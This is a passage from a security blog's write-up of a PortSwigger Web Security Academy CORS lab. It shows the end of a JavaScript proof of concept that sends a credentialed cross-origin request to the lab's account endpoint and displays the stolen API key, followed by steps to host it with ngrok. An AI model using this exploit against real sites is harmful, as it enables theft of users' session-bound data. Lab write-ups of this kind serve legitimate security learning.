</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>• Access-Control-Allow-Credentials: true<span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>This combination allows ANY origin to:<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>✓ Make authenticated requests<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>✓ Read sensitive response data<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>✓ Steal user information<span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>&lt;strong&gt;Impact:&lt;/strong&gt; Complete bypass of Same-Origin Policy<span style="color:#e6db74">&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        console.log(&#34;🎉 SUCCESS - API Key stolen:&#34;, data.apikey);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        console.log(&#34;Full stolen data:&#34;, data);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        // In real attack, this data would be exfiltrated
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        console.log(&#34;📤 In real attack, data would be sent to attacker server&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    } catch(e) {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        document.getElementById(&#39;</span>result<span style="color:#e6db74">&#39;).textContent = 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                            &#39;</span>Raw response:<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; + req.responseText;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    }
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                } else if (req.status === 401) {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    // Not logged in
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    document.getElementById(&#39;</span>status<span style="color:#e6db74">&#39;).className = &#39;</span>status error<span style="color:#e6db74">&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    document.getElementById(&#39;</span>status<span style="color:#e6db74">&#39;).innerHTML = 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>❌ &lt;strong&gt;Authentication Required <span style="color:#f92672">(</span><span style="color:#ae81ff">401</span> Unauthorized<span style="color:#f92672">)</span>&lt;/strong&gt;<span style="color:#e6db74">&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    document.getElementById(&#39;</span>result<span style="color:#e6db74">&#39;).innerHTML = 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>&lt;strong style<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;color: #d9534f;&#34;</span>&gt;Exploitation Failed - Victim Not Authenticated&lt;/strong&gt;<span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>The target user is not logged into the application.<span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>&lt;strong&gt;To test this exploit:&lt;/strong&gt;<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>1. Open a new tab in the SAME browser<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>2. Go to: https://0a9100ff03dc089a80b21c1000c600d7.web-security-academy.net/login<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>3. Log in with:<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>   Username: wiener<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>   Password: peter<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>4. Keep that tab open<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>5. Reload THIS page<span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>The exploit should <span style="color:#66d9ef">then</span> succeed.<span style="color:#e6db74">&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    document.getElementById(&#39;</span>proof<span style="color:#e6db74">&#39;).textContent = 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>Status Code: <span style="color:#ae81ff">401</span> Unauthorized<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>Reason: No valid session cookie<span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>Note: The CORS misconfiguration still exists,<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>but requires an authenticated victim to exploit.<span style="color:#e6db74">&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    console.error(&#34;❌ 401 Unauthorized - victim not logged in&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                } else if (req.status === 0) {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    // CORS blocked or network error
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    document.getElementById(&#39;</span>status<span style="color:#e6db74">&#39;).className = &#39;</span>status error<span style="color:#e6db74">&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    document.getElementById(&#39;</span>status<span style="color:#e6db74">&#39;).innerHTML = 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>❌ &lt;strong&gt;Request Blocked or Failed&lt;/strong&gt;<span style="color:#e6db74">&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    document.getElementById(&#39;</span>result<span style="color:#e6db74">&#39;).innerHTML = 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>&lt;strong&gt;Possible Causes:&lt;/strong&gt;<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>• Victim not logged in <span style="color:#f92672">(</span>most likely<span style="color:#f92672">)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>• Network connectivity issue<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>• CORS vulnerability has been fixed<span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>Check the browser console <span style="color:#f92672">(</span>F12<span style="color:#f92672">)</span> <span style="color:#66d9ef">for</span> more details.<span style="color:#e6db74">&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    console.error(&#34;❌ Status 0 - Request blocked or failed&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                } else {
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    // Other error
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    document.getElementById(&#39;</span>status<span style="color:#e6db74">&#39;).className = &#39;</span>status error<span style="color:#e6db74">&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    document.getElementById(&#39;</span>status<span style="color:#e6db74">&#39;).innerHTML = 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>❌ &lt;strong&gt;Error: <span style="color:#e6db74">&#39; + req.status + &#39;</span> <span style="color:#e6db74">&#39; + req.statusText + &#39;</span>&lt;/strong&gt;<span style="color:#e6db74">&#39;;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    document.getElementById(&#39;</span>result<span style="color:#e6db74">&#39;).textContent = 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>Unexpected error occurred.<span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>Status: <span style="color:#e6db74">&#39; + req.status + &#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39; +
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                        &#39;</span>Status Text: <span style="color:#e6db74">&#39; + req.statusText;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                    console.error(&#34;❌ Error:&#34;, req.status, req.statusText);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                }
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            }
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        };
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        // Make the malicious request
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        req.open(&#39;</span>GET<span style="color:#e6db74">&#39;, &#39;</span>https://0a9100ff03dc089a80b21c1000c600d7.web-security-academy.net/accountDetails<span style="color:#960050;background-color:#1e0010">&#39;</span>, true<span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>        req.withCredentials <span style="color:#f92672">=</span> true;  // Include cookies
</span></span><span style="display:flex;"><span>        req.send<span style="color:#f92672">()</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        console.log<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;📤 Malicious cross-origin request sent with credentials&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>    &lt;/script&gt;
</span></span><span style="display:flex;"><span>&lt;/body&gt;
</span></span><span style="display:flex;"><span>&lt;/html&gt;
</span></span></code></pre></div><h2 id="testing">Testing</h2>
<h3 id="step-8-set-up-local-test-environment">Step 8: Set Up Local Test Environment</h3>
<p>Start a web server:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Create project directory</span>
</span></span><span style="display:flex;"><span>mkdir cors-exploit-demo
</span></span><span style="display:flex;"><span>cd cors-exploit-demo
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Save the exploit as cors_exploit.html</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start Python web server</span>
</span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># In a new terminal, start ngrok</span>
</span></span><span style="display:flex;"><span>ngrok http <span style="color:#ae81ff">8000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ngrok will provide you with a public URL like:                                                                                                                                                                            <span style="color:#f92672">(</span>Ctrl+C to quit<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>                                                                                                                                                                                                 
</span></span><span style="display:flex;"><span>🐋 Create instant endpoints <span style="color:#66d9ef">for</span> local containers within Docker Desktop → https://ngrok.com/r/docker                                                                                              
</span></span><span style="display:flex;"><span>                                                                                                                                                                                                 
</span></span><span style="display:flex;"><span>Session Status                online                                                                                                                                                             
</span></span><span style="display:flex;"><span>Account                       example@gmail.com <span style="color:#f92672">(</span>Plan: Free<span style="color:#f92672">)</span>                                                                                                                    
</span></span><span style="display:flex;"><span>Version                       3.30.0                                                                                                                                                             
</span></span><span style="display:flex;"><span>Region                        Europe <span style="color:#f92672">(</span>eu<span style="color:#f92672">)</span>                                                                                                                                                        
</span></span><span style="display:flex;"><span>Latency                       39ms                                                                                                                                                               
</span></span><span style="display:flex;"><span>Web Interface                 http://127.0.0.1:4040                                                                                                                                              
</span></span><span style="display:flex;"><span>Forwarding                    https://arabinosic-edra-overplainly.ngrok-free.dev -&gt; http://localhost:8000                                                                                        
</span></span><span style="display:flex;"><span>                                                                                                                                                                                                 
</span></span><span style="display:flex;"><span>Connections                   ttl     opn     rt1     rt5     p50     p90                                                                                                                        
</span></span><span style="display:flex;"><span>                              <span style="color:#ae81ff">0</span>       <span style="color:#ae81ff">0</span>       0.00    0.00    0.00    0.00        
</span></span></code></pre></div><h3 id="step-9-test-the-exploit">Step 9: Test the Exploit</h3>
<p>Important: Use a fresh incognito/private window to avoid cookie conflicts!
Terminal setup:</p>
<pre tabindex="0"><code>Terminal 1: Python server running on port 8000
Browser: Incognito window with 2 tabs
</code></pre><p>Tab 1 - Log into the lab:</p>
<pre tabindex="0"><code>1. Open: https://0a9100ff03dc089a80b21c1000c600d7.web-security-academy.net/login
2. Login: wiener / peter
3. Verify you see &#34;Your email is...&#34;
4. Keep this tab open!
</code></pre><p>Tab 2 - Run the exploit (same incognito window):</p>
<pre tabindex="0"><code>1. Open: https://whatever-edra-overplainly.ngrok-free.dev/poc_cors.html
2. Watch the exploit execute
3. See the stolen data displayed
</code></pre><p><img src="/images/ngrok.png" alt="alt"></p>


        

        

        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="https://cyberroute.github.io/post/2024-03-11-bruter/" data-toggle="tooltip" data-placement="top" title="Presenting Bruter: a Web Server Testing Tool">&larr; Previous Post</a>
            </li>
          
          
        </ul>
      


      
        
          
          <div class="disqus-comments">
            <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "https-cyberroute-github-io" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
          </div>
          
        
        
      

    </div>
  </div>
</div>

      
<footer>
  <div class="container">
    
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
              <li>
		
		  <a href="mailto:cyberroute@proton.me" title="Email me">
		
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
		
		  <a href="https://github.com/CyberRoute" title="GitHub">
		
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
              <li>
		
		  <a href="https://linkedin.com/in/alessandro-bresciani-35763610" title="LinkedIn">
		
                  <span class="fa-stack fa-lg">
                    <i class="fas fa-circle fa-stack-2x"></i>
                    <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
                  </span>
                </a>
              </li>
          
        </ul>
        <p class="credits copyright text-muted">
          
            
              Alessandro Bresciani
            
          

          &nbsp;&bull;&nbsp;&copy;
          
            2025
          

          
            &nbsp;&bull;&nbsp;
            <a href="https://cyberroute.github.io/">Blog</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="https://gohugo.io">Hugo v0.123.7</a> powered &nbsp;&bull;&nbsp; Theme <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a> adapted from <a href="https://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a>
          
        </p>
      </div>
    </div>
  </div>
</footer><script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js" integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js" integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="https://cyberroute.github.io/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://cyberroute.github.io/js/load-photoswipe.js"></script>









    
  </body>
</html>

